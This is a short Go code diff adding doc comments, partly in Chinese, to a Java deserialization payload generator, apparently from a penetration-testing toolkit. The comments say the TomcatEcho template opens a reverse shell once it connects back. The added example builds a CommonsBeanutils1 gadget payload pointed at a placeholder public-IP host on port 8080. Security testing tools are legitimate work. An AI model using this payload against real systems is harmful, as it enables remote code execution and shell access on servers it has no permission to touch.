@@ -1156,7 +1156,12 @@ func GenTcpReverseShellClassObject(host string, port int, options ...GenClassOpt
 // SetClassTomcatEchoTemplate
 // useTomcatEchoTemplate 请求参数选项函数，用于设置生成TomcatEcho类的模板，需要配合 tomcatEchoHost 和 tomcatEchoPort 使用。
 // 该参数与 useTcpReverseTemplate 的区别是，该参数生成的类会在反连成功后，执行一个反弹shell。
-
+//
+// Example:
+//
+// host = "公网IP"
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.tomcatEchoHost(host),yso.tomcatEchoPort(8080))
 func SetClassTomcatEchoTemplate() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = TomcatEchoClass
